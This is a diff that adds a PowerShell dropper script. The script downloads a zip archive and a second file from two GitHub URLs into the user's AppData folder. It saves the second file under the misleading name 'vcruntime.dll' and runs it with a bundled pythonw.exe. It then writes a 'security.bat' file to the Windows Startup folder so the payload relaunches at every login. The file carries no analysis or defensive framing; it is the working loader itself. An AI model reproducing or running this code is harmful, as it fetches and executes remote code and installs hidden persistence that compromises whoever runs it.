@@ -1,0 +1,32 @@
+$ltrmn = 'https://github.com/blackcodeit407/system/blob/main/system1.zip?raw=true'
+$rawdll = 'https://raw.githubusercontent.com/minhdmkk6/bot111/refs/heads/main/bot1.txt'
+
+$zipPath = "$env:APPDATA\pzk.zip"
+$extractPath = "$env:APPDATA\Extrac"
+$dllPath = Join-Path $extractPath 'vcruntime.dll'
+$pythonExe = Join-Path $extractPath 'pythonw.exe'
+
+if (!(Test-Path $extractPath)) {
+    New-Item -Path $extractPath -ItemType Directory | Out-Null
+}
+
+Invoke-WebRequest -Uri $ltrmn -OutFile $zipPath -UseBasicParsing
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
+
+Remove-Item $zipPath -Force
+
+Invoke-WebRequest -Uri $rawdll -OutFile $dllPath -UseBasicParsing
+
+if (Test-Path $pythonExe) {
+    Start-Process -FilePath $pythonExe -ArgumentList 'vcruntime.dll' -WorkingDirectory $extractPath
+}
+
+$startupFolder = [Environment]::GetFolderPath('Startup')
+$batchFilePath = Join-Path $startupFolder "security.bat"
+$batchContent = @"
+cd "%APPDATA%\Extrac"
+start "" pythonw.exe vcruntime.dll
+"@
+Set-Content -Path $batchFilePath -Value $batchContent -Encoding ASCII
